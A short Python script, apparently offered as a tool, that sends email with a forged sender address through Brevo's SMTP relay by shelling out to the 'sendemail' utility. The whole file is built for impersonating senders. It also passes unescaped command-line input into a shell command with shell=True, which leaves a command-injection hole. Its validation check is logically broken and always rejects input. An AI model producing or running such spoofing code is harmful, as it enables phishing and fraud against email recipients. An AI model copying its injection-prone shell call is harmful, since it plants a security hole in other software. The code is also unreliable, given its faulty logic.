import subprocess
import sys

# SMTP server configuration
# Make sure to replace the following with valid credentials.
# You can find the SMTP settings from your email service provider's documentation.
# Example for Brevo (formerly Sendinblue): smtp-relay.brevo.com and port 587.
smtp_server = "smtp-relay.brevo.com"  
smtp_port = 587 
login = "email"  # Censored - Replace with your actual email address for SMTP login - Find it at brevo.com
password = "pword"  # Censored - Replace with your actual email password or SMTP key - Find it at brevo.com

# Email parameters - Input through command-line arguments
spoofed_email = sys.argv[1]  # Email address you want to spoof as the sender
target_email = sys.argv[2]  # Recipient's email address
subject = sys.argv[3]  # Subject of the email
message = sys.argv[4]  # Body of the email

# Try to send the email
try:
    # Basic validation to check if the spoofed or target emails are valid (i.e., contain '@')
    if "@" not in spoofed_email or target_email:
        print("Please enter a valid email!")  # Prompt user to enter a valid email format
    else:
        # Subprocess call to the 'sendemail' utility
        # Make sure to have the 'sendemail' tool installed on your system
        subprocess.call(f'sendemail -xu {login} -xp {password} -s {smtp_server}:{str(smtp_port)} -f "{spoofed_email}" -t "{target_email}" -u "{subject}" -m "{message}"', shell=True)
except Exception as e:
    # Handle any exceptions and print the error message
    print(e)
    sys.exit(1)  # Exit the script in case of failure
